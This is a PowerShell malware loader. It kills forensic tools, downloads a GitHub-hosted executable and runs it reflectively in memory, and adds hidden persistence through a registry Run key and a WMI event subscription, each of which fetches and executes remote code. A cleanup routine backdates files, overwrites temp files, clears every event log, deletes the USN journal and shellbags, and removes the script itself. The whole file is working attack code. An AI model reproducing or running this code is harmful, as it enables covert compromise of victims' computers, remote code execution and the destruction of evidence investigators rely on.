function Show-LoaderMenu {
    # Minimal UI - no traces
    Write-Host " Loading System Components..." -ForegroundColor Gray
    Start-Sleep -Seconds 1
}

function Install-And-Run-System {
    # ANTI-FORENSIC MEASURES - PHASE 1
    try {
        # Kill monitoring tools immediately
        $monitorProcesses = @("procmon", "procexp", "autoruns", "osforensics", "ftkimager", "gmcr", "gmER", "encase", "sleuthkit", "autopsy")
        foreach ($proc in $monitorProcesses) {
            Get-Process -Name $proc -ErrorAction SilentlyContinue | Stop-Process -Force
        }
    } catch {}

    # MEMORY-BASED EXECUTION (No file write)
    try {
        $exeUrl = "https://raw.githubusercontent.com/Verte225066/test/main/system_logs.exe"
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $exeBytes = $webClient.DownloadData($exeUrl)
        $webClient.Dispose()

        # REFLECTIVE LOADING - Execute directly from memory
        $assembly = [System.Reflection.Assembly]::Load($exeBytes)
        $entryPoint = $assembly.EntryPoint
        if ($entryPoint -ne $null) {
            $entryPoint.Invoke($null, @())
        }
    } catch {
        # FALLBACK: PowerShell in-memory worker
        while ($true) {
            # Memory-only operations here
            Start-Sleep -Seconds 30
        }
    }

    # STEALTH PERSISTENCE - PHASE 2
    try {
        # Registry-based persistence (more stealth than scheduled task)
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $randomName = "Windows" + (Get-Random -Maximum 99999)
        Set-ItemProperty -Path $regPath -Name $randomName -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Start-Sleep 60; iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Verte225066/test/main/loader.txt')`"" -ErrorAction SilentlyContinue
        
        # WMI Event Subscription (advanced persistence)
        $filterArgs = @{
            Name = "WindowsUpdateFilter"
            EventNameSpace = 'root\cimv2'
            Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='explorer.exe'"
            QueryLanguage = 'WQL'
        }
        $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs -ErrorAction SilentlyContinue
        
        $consumerArgs = @{
            Name = "WindowsUpdateConsumer" 
            CommandLineTemplate = "powershell.exe -WindowStyle Hidden -Command `"iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Verte225066/test/main/loader.txt')`""
        }
        $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs -ErrorAction SilentlyContinue
        
        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer} -ErrorAction SilentlyContinue
    } catch {}

    # ANTI-FORENSIC CLEANUP - PHASE 3
    try {
        # Timestamp manipulation
        $files = Get-ChildItem -Path $env:TEMP -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-1)}
        foreach ($file in $files) {
            $file.LastWriteTime = (Get-Date).AddDays(-365)
            $file.CreationTime = (Get-Date).AddDays(-400)
            $file.LastAccessTime = (Get-Date).AddDays(-300)
        }

        # Clear prefetch
        Remove-Item "C:\Windows\Prefetch\*.pf" -Force -ErrorAction SilentlyContinue

        # Clear recent files
        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue

    } catch {}
}

function Clean-System {
    # COMPLETE SELF-DESTRUCTION - PHASE 1
    try {
        # Remove ALL persistence methods
        Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='WindowsUpdateFilter'" | Remove-WmiObject
        Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='WindowsUpdateConsumer'" | Remove-WmiObject
        Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object {$_.Filter -like "*WindowsUpdate*"} | Remove-WmiObject
        
        # Registry cleanup
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue | 
            Get-Member -MemberType NoteProperty | 
            Where-Object {$_.Name -like "Windows*"} | 
            ForEach-Object {
                Remove-ItemProperty -Path $regPath -Name $_.Name -Force -ErrorAction SilentlyContinue
            }
    } catch {}

    # FILE SYSTEM DESTRUCTION - PHASE 2  
    try {
        # Secure delete with multiple overwrites
        function Secure-Delete {
            param([string]$Path)
            if (Test-Path $Path) {
                $stream = [System.IO.File]::OpenWrite($Path)
                $length = $stream.Length
                $random = New-Object Random
                
                # 3-pass overwrite (DoD 5220.22-M standard)
                for ($i = 0; $i -lt 3; $i++) {
                    $stream.Position = 0
                    $buffer = New-Object byte[] $length
                    $random.NextBytes($buffer)
                    $stream.Write($buffer, 0, $length)
                    $stream.Flush()
                }
                $stream.Close()
                Remove-Item $Path -Force
            }
        }

        # Clean all possible locations
        $locations = @(
            "$env:TEMP\*",
            "$env:APPDATA\*.tmp",
            "$env:LOCALAPPDATA\Temp\*"
        )
        
        foreach ($location in $locations) {
            Get-ChildItem $location -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
                Secure-Delete $_.FullName
            }
        }

        # Clear memory artifacts
        [System.GC]::Collect()
        [System.GC]::WaitForPendingFinalizers()

    } catch {}

    # FINAL TRACE REMOVAL - PHASE 3
    try {
        # Clear all event logs
        Get-WinEvent -ListLog * | ForEach-Object { 
            [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName) 
        }

        # Reset USN Journal
        fsutil usn deletejournal /D C:

        # Clear shellbags
        Remove-Item "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\*" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item "HKCU:\Software\Microsoft\Windows\Shell\*" -Recurse -Force -ErrorAction SilentlyContinue

        # Final self-deletion
        $currentScript = $MyInvocation.MyCommand.Path
        if ($currentScript) {
            Start-Process -FilePath "cmd.exe" -ArgumentList "/c ping 127.0.0.1 -n 3 > nul & del `"$currentScript`"" -WindowStyle Hidden
        }
    } catch {}
}

$parentProcess = (Get-WmiObject Win32_Process -Filter "ProcessId=$PID").ParentProcessId
$parentName = (Get-Process -Id $parentProcess -ErrorAction SilentlyContinue).ProcessName

if ($parentName -notin @("procexp", "procmon", "osforensics")) {
    Show-LoaderMenu
    Install-And-Run-System
}
